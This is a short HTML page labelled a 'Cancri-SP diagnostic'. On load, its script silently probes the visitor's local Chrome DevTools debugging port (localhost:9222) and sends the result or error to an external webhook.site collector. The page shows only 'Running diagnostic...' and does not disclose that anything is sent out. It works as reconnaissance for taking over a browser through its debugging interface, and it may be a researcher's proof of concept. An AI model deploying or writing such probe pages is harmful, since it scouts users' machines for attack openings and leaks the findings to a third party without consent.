
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Cancri-SP diagnostic</title>
</head>
<body>
<pre id="status">Running diagnostic...</pre>

<script>
(async () => {
  const hook =
    "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";

  async function report(message) {
    document.getElementById("status").textContent = message;
    try {
      await fetch(hook, {
        method: "POST",
        mode: "no-cors",
        body: message
      });
    } catch (e) {
      console.error(e);
    }
  }

  try {
    const response = await fetch(
      "http://localhost:9222/json/version"
    );

    await report(
      "DevTools status: " + response.status
    );
  } catch (e) {
    await report("Connection error: " + String(e));
  }
})();
</script>
</body>
</html>
